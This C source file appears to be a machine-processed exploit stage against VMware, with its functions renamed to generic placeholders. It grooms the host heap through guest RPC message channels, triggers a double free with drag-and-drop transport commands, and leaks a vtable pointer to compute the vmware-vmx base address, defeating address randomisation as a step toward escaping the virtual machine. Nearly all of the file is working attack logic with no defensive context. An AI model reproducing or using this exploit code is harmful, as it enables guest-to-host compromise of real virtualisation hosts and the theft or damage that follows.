#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  Message_Channel ;

/* Variables and functions */
 int MAX_LFH_BLOCK ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *,char*,int) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  FUNC4 () ; 
 int /*<<< orphan*/  FUNC5 (char*,int,char**,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC6 (int) ; 
 int cbObj ; 
 char* chgver ; 
 char* dndtransport ; 
 char* FUNC7 (int) ; 
 int /*<<< orphan*/  FUNC8 (size_t*,char*,int) ; 
 int /*<<< orphan*/  FUNC9 (char*,char,int) ; 
 int FUNC10 (int,int) ; 
 int /*<<< orphan*/  FUNC11 (char*,size_t) ; 
 int /*<<< orphan*/  FUNC12 (char*) ; 
 char* readstring ; 
 scalar_t__ FUNC13 (char*,char*) ; 
 char* FUNC14 (char*,char*) ; 
 int FUNC15 (char*) ; 
 char* tov2 ; 
 char* tov4 ; 

size_t FUNC16()
{
#define MAX_LFH_BLOCK 512
    Message_Channel *chans[5] = {0};
    for (int i = 0; i < 5; ++i)
    {
        chans[i] = FUNC1(0x49435052);
        if (chans[i])
        {
            FUNC3(chans[i], cbObj - 1); //just alloc
        }
        else
        {
            FUNC0(chans[i - 1]); //keep 1 channel valid
            chans[i - 1] = 0;
            break;
        }
    }
    FUNC4(); //make sure we have at least 7 hole or open and occupy next LFH block
    for (int i = 0; i < 5; ++i)
    {
        if (chans[i])
        {
            FUNC0(chans[i]);
        }
    }

    char *result = NULL;
    char *pObj = FUNC7(cbObj);
    FUNC9(pObj, 'A', cbObj);
    pObj[cbObj - 1] = 0;
    char *spary2 = FUNC14("guest.upgrader_send_cmd_line_args %s", pObj);
    while (1)
    {
        for (int i = 0; i < MAX_LFH_BLOCK; ++i)
        {
            FUNC5(tov4, FUNC15(tov4), &result, NULL);
            FUNC5(chgver, FUNC15(chgver), &result, NULL);
            FUNC5(tov2, FUNC15(tov2), &result, NULL);
            FUNC5(chgver, FUNC15(chgver), &result, NULL);
        }

        for (int i = 0; i < MAX_LFH_BLOCK; ++i)
        {
            Message_Channel *chan = FUNC1(0x49435052);
            if (chan == NULL)
            {
                FUNC12("Message send error!");
                FUNC6(100);
            }
            else
            {
                FUNC3(chan, cbObj - 1);
                FUNC2(chan, "\xA0\x75", 2); //just ret
                FUNC0(chan);
            }
        }
        Message_Channel *chan = FUNC1(0x49435052);
        FUNC3(chan, cbObj - 1);
        FUNC2(chan, "\xA0\x74", 2);                                 //free
        FUNC5(dndtransport, FUNC15(dndtransport), &result, NULL); //trigger double free
        for (int i = 0; i < FUNC10(cbObj-3,MAX_LFH_BLOCK); ++i)
        {
            FUNC5(spary2, FUNC15(spary2), &result, NULL);
            FUNC2(chan, "B", 1);
            FUNC5(readstring, FUNC15(readstring), &result, NULL);
            if (result[0] == 'A' && result[1] == 'A' && FUNC13(result, pObj))
            {
               FUNC0(chan); //free the string
                for (int i = 0; i < MAX_LFH_BLOCK; ++i)
                {
                    FUNC12("Trying to leak vtable");
                    FUNC5(tov4, FUNC15(tov4), &result, NULL);
                    FUNC5(chgver, FUNC15(chgver), &result, NULL);
                    FUNC5(readstring, FUNC15(readstring), &result, NULL);
                    size_t p = 0;
                    if (result)
                    {
                        FUNC8(&p, result, FUNC10(FUNC15(result), 8));
                        FUNC11("Leak content: %p\n", p);
                    }
                    size_t low = p & 0xFFFF;
                    if (low == 0x74A8 || //RpcBase
                        low == 0x74d0 || //CpV4
                        low == 0x7630)   //DnDV4
                    {
                        FUNC11("vmware-vmx base: %p\n", (p & (~0xFFFF)) - 0x7a0000);
                        return (p & (~0xFFFF)) - 0x7a0000;
                    }
                    FUNC5(tov2, FUNC15(tov2), &result, NULL);
                    FUNC5(chgver, FUNC15(chgver), &result, NULL);
                }
            }
        }
        FUNC0(chan);
    }
    return 0;
}